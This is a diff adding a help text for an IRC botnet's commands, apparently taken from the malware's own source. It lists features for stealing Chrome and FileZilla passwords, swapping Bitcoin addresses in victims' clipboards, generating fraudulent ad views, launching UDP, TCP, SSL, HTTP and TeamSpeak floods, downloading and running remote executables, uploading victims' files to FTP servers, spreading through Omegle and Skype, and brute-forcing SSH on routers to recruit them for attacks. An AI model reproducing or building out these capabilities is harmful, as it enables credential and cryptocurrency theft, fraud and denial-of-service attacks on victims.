@@ -1,0 +1,58 @@
+Run !command.help, for help.
+!chromestealer keyword/ALL - Steal Google Chrome passwords for all Chrome identities based on a search query or grab all of them.
+!SmartView.Timer NUMBER (ex. 30.0) - Open specified web page/s every x seconds - can't be 0.
+!SmartView.SetWebsites - http://coinurl.com/ad.php|http://google.ru/adsense|http://youtube.com/watch?v=views - shorten URLs for hit tracking + a referer. Auto enables Smart View if timer > 1.0 seconds, set the timer before/after setwebsites - it'll function normally. Opens URL/s as popup from the browser in use. If no browser is in use it'll open in a random installed browser so hits look legitimate. Pages get saved for next reboot.
+!SmartView.Disable - Disables Smart View.
+!SmartView.Status - Tells you weather or not Smart View is running.
+!shellbooter time(seconds) ip port http://pastebin.com/shell-list.txt threads(per shell) - Shell booter API
+!clipcoin.disable - Disable stealing/replacing bots' BTC addresses in clipboard.
+!clipcoin.setaddress BTC_ADDRESS - Set the BTC address you'd like replaced from bots' clipboard - Active on next reboot.
+!clipcoin.status - Get status of BTC address clipboard stealer/replacer
+!ip - Grabs the public IP address of the bot.
+!logout - Logs out all users.
+!login User - Allows a user to send commands to the bots.
+!silent - Disable bot command responses.
+!noisy - Enable bot command reponses.
+!ddos.udpflood host port speed(seconds between packets i.e 0.1)
+!ddos.tcpflood host port tor[1/0] threads
+!ddos.sslflood host port tor[1/0] threads
+!ddos.ftpflood host port tor[1/0] threads
+!ddos.ftpsflood host port tor[1/0] threads
+!ddos.teamspeak host port tor[1/0] threads
+!ddos.teamspeaks host port tor[1/0] threads
+!ddos.httpflood host port tor[1/0] threads
+!ddos.httpsflood host port tor[1/0] threads
+!stophttpsflood - Stops any running HTTPS flood/s.
+!stophttpflood - Stops any running HTTPS flood/s.
+!stopsslflood - Stops any running SSL flood/s.
+!stoptcpflood - Stops any running TCP flood/s.
+!stopudpflood
+!stopteamspeak
+!stopteamspeaks
+!httpfloodstatus
+!httpsfloodstatus
+!update http://example.com/direct-link.exe SHA256_hash(if you wish SHA256 hash verification).
+!download&execute http://example.com/direct-link.exe SHA256_hash(if you wish to use SHA256 hash verification).
+!omeglespreader Skype/URL[Choice] Skype Threads
+!omeglestatus
+!stopomeglespreader
+!die
+!uninstall confirm
+!os
+!checkhost host[www.example.com] port[80]
+!botkiller.status
+!botkiller.on
+!botkiller.off
+!howmanyprocesses Process_Name.exe
+!isprocessrunning Process_Name.exe
+!say text to output via the speakers
+!dir C:\ - Lists all files & folders within a directory. You can use things like !dir %AppData%\Bitcoin
+!UploadFile ftpserver.com user password /remotefile.txt C:\localfile.txt
+!ReadFile \Documents and Settings\Admin\Desktop\file.txt - Read a file line-by-line to the IRC channel. You may specify one environment variable using percent signs, such as %APPDATA%.
+!FileZilla Keyword - Retrieves saved FileZilla logins if they contain a keyword. Set the keyword as ALL to return all saved logins
+!SSHScannerStatus - Outputs weather or not any SSH scans are running
+!SSHScanner A,B,C/192,192.168,192.168.1 ftp/http/https/ftps://example.com/user-pass-combo.list(or A/B/C/D) 1/0(block gov ips) 1/0(use Tor for port scan) 3(tcp port scan ping timeout) 35(ssh connection timeout) min_chars(minimum amount of characters to use when brute-forcing, if applicable.) max_chars(maximum amount of characters to use when brute-forcing, if applicable.) 22(port, use commas for multiple ports, such as 22,2222,21) 1/0(send the roots to your server - disabled) 256(threads). - Use multiple IP ranges, or just scan one. Combo list should have a username and password on each line, such as root:alpine. A Range = tiny, great for quick routers. covers most logins. B Range = larger, covers more routers. C Range = giant, covers even more routers and servers. D Range = large, covers only root user and mostly routers.", s, outputChannel)
+!SSHDDoS mode[1=httpflood,2=stopddos,3=pingflood,4=udpflood(does not work on most routers)] server[example.com] processes[amount of attack processes on each router] port[udp only] seconds_between_packets[can be a decimal, udp only] time[seconds, udp only] - Put %rand% somewhere in the server for a random number from 0 to 25565 - Uses routers cracked through your bots to launched an attack.
+!sshservers - Outputs the amount of routers the bot has cracked.
+!StopSSHScanner - Stops any running SSH scans.
+!KillProcess process_name.exe
